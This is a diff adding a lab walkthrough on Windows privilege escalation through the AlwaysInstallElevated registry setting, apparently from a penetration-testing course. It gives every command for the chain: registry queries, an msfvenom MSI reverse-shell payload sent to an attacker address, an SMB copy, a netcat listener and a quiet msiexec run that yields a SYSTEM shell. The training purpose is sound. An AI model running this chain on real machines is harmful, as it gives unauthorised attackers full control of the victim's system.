@@ -1,0 +1,64 @@
+# 🐾 Task 8: Registry - AlwaysInstallElevated
+---
+
+## 📜 Task Description
+In this task, we will explore a vulnerability associated with the `AlwaysInstallElevated` registry key. This key allows installers to run with SYSTEM privileges, even when executed by a low-privilege user. We will leverage this to gain a reverse shell with SYSTEM privileges using the Windows Installer.
+
+---
+
+## 🔍 Step 1: Checking the Registry Keys
+First, check if the `AlwaysInstallElevated` registry values are set. Execute the following commands:  
+`reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`  
+`reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+
+### 📋 Expected Output
+- Confirm that both keys are set to `1` (0x1), which enables installers to run with SYSTEM privileges.  
+![image](https://github.com/user-attachments/assets/3c48a59a-a572-433b-9279-45cd39ec1312)
+
+---
+
+## 🔑 Step 2: Generating a Reverse Shell Using msfvenom
+Now, use `msfvenom` on Kali to create an `.msi` installer file with a reverse shell payload. Execute the following command:  
+`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi`
+
+### 📋 Expected Output
+- Confirm that the `reverse.msi` file has been successfully created.
+
+---
+
+## 📝 Step 3: Transferring the File to Windows
+Transfer the `reverse.msi` file to the target Windows machine in the `C:\PrivEsc` directory. Use an SMB server for the transfer:
+
+1. Start an SMB server on Kali (if not already running).
+2. Copy the file from Kali to Windows:  
+   `copy \\LHOST\kali\reverse.msi C:\PrivEsc\reverse.msi`
+
+### 📋 Expected Output
+- Confirm that the file has been successfully transferred to `C:\PrivEsc`.
+
+---
+
+## 🎧 Step 4: Setting Up the Listener
+Before executing the installer, ensure you have a listener running on Kali. Start the listener using the following command:  
+`nc -lvnp 53`
+
+---
+
+## 🚀 Step 5: Running the Installer
+Now, execute the `reverse.msi` installer, which will trigger the reverse shell with SYSTEM privileges. Run the following command on the target Windows machine:  
+`msiexec /quiet /qn /i C:\PrivEsc\reverse.msi`
+
+### 📋 Expected Output
+- Confirm that you have received a reverse shell with SYSTEM privileges on Kali.  
+![image](https://github.com/user-attachments/assets/b0432081-ff06-4f95-a508-dc09c1b2313e)
+
+---
+
+## 🎉 Congratulations!
+You have successfully exploited the `AlwaysInstallElevated` registry vulnerability to run an installer with SYSTEM privileges and gain a reverse shell! 🎊
+
+---
+
+## 📌 Notes
+- Ensure you fully understand each step and its consequences.
+- Use this knowledge responsibly and only within authorized penetration testing engagements.
